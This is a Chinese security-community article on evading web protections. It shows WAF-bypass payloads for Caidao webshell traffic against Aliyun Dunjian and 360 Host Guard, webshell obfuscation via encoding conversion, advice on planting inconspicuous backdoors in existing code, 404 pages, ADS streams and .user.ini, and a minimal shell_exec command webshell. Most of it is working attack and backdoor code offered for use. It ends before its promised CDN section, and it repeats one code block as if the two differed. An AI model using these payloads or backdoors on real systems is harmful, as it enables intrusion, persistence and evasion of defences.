### 先知技术社区独家发表本文，如需转载，请先联系先知技术社区授权；未经授权请勿转载。

**0x00 前言**

> I am back... 再不出这篇就要被笑然老板吊打了...
>
> 本来打算写一篇关于免杀的文章，但考虑到这可能是系列文章的最后一篇，决定将其作为汇总，并涵盖一些较为冷门的主题。在撰写本文时，我对前两篇文章进行了增补和修改。本文将重点讨论以下几点，虽然内容并不全面，但在实际操作中非常实用：
>
> * 绕过菜刀连接拦截
> * Webshell 免杀
> * 绕过禁止执行程序
> * 绕过 CDN 查找原 IP

**0x01 绕过菜刀连接拦截**

本节将通过两个案例说明如何绕过菜刀连接拦截。我们可以通过稍微修改菜刀的原始数据来实现绕过，证明拦截规则不能简单地照搬。

#### 案例一：阿里云盾

假设以下 POST 数据会被云盾拦截：

```php
@eval%01(base64_decode($_POST[z0]));
```

测试发现 `eval` 函数被过滤了。有趣的是，如果在左括号前面插入 `%00`，则不会被拦截：

```php
@eval%00(base64_decode%00($_POST[z0]));
```

接下来是绕过 `base64` 解码部分。这段 `base64` 解码后的 PHP 代码用于获取机器信息。云盾能够逐段识别 `base64` 编码，因此我们需要进行一些调整：

```php
QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIp  // 拦截
QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMC%01Ip  // 不拦截
```

进一步测试发现，在 `%2B` 前面插入字符可以绕过拦截：

```php
a=@eval%00(base64_decode%00($_POST[z0]));&z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMC%01IpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%01%2BfCIpOzskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7aWYoJEQ9PSIiKSREPWRpcm5hbWUoJF9TRVJWRVJbIlBBVEhfVFJBTlNMQVRFRCJdKTskUj0ieyREfVx0IjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJBIiwiWiIpIGFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9JFIuPSJcdCI7JHU9KGZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0ZWdpZCcpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6Jyc7JHVzcj0oJHUpPyR1WyduYW1lJ106QGdldF9jdXJyZW50X3VzZXIoKTskUi49cGhwX3VuYW1lKCk7JFIuPSIoeyR1c3J9KSI7cHJpbnQgJFI7O2VjaG8oInw8LSIpO2RpZSgpOw==
```

#### 案例二：360主机卫士

360主机卫士直接将菜刀请求标记为 `"AttackType":"Caidao webshell"` 样本。只需在 `eval` 函数前面插入任意 `urlencode` 的字符即可绕过：

```php
@eval%00(base64_decode%00($_POST[z0]));
```

**0x02 Webshell 免杀**

Webshell 免杀主要针对主机防护软件。以安全狗、云锁和主机卫士为例，介绍一种编码转换的方法：

```php
mb_convert_encoding($str, $encoding1, $encoding2);
```

这个函数用于编码转换。例如，使用 `UTF-16BE` 编码：

```php
$str = base64_decode("cGhwaW5mbygpOw==");
$str1 = mb_convert_encoding($str, "GBK");
@eval($str1);
```

为了用户体验，主机防护软件通常不会拦截不可控的 `eval` 函数调用。但只要外部可控就会被拦截。通过处理后可以绕过：

```php
$str = base64_decode("cGhwaW5mbygpOw==");
$str1 = mb_convert_encoding($str, "GBK");
@eval($str1);
```

个人不推荐使用过于复杂的后门或混淆加密，因为后期维护时仍有可能被查到。建议间接利用程序自身来做后门，尽量减少改动，避免添加新文件。例如：

* 利用 404 页面
* 在正常程序中多次调用 GET、POST、Cookie 的代码里：
  ```php
  $a = $_POST['a'];
  $b = $_POST['b'];
  $a($b); // a=assert & b=phpinfo()
  ```
* 利用 ADS 流
* 利用 `.user.ini` 文件（参考 wooyun-drops-tips-3424）

**0x03 绕过禁止执行程序**

以 Safedog 为例，最新版 Safedog IIS 4.0 已不再显示禁止 IIS 执行程序的白名单。以下是旧版本的白名单列表：

```plaintext
%windows%Microsoft.NET/Framework/v1.1.4322/aspnet_wp.exe
%windows%Microsoft.NET/Framework/v1.1.4322/csc.exe
%windows%Microsoft.NET/Framework/v1.1.4322/vbc.exe
%windows%Microsoft.NET/Framework/v2.0.50727/aspnet_wp.exe
%windows%Microsoft.NET/Framework/v2.0.50727/csc.exe
%windows%Microsoft.NET/Framework/v2.0.50727/vbc.exe
%windows%Microsoft.NET/Framework/v4.0.30319/aspnet_wp.exe
%windows%Microsoft.NET/Framework/v4.0.30319/csc.exe
%windows%Microsoft.NET/Framework/v4.0.30319/vbc.exe
%windows%system32/drwatson.exe
%windows%system32/drwtsn32
%windows%system32/drwtsn32.exe
%windows%system32/vsjitdebugger.exe
C:/Windows/Microsoft.Net/Framework/v3.5/csc.exe
C:/Windows/Microsoft.Net/Framework/v3.5/vbc.exe
```

首先，创建一个简单的 CMD 小马：

```php
<?php
$cmd = $_GET['cmd'];
echo shell_exec($cmd);
?>
```

通过这种方式，可以在受限制的环境中执行命令。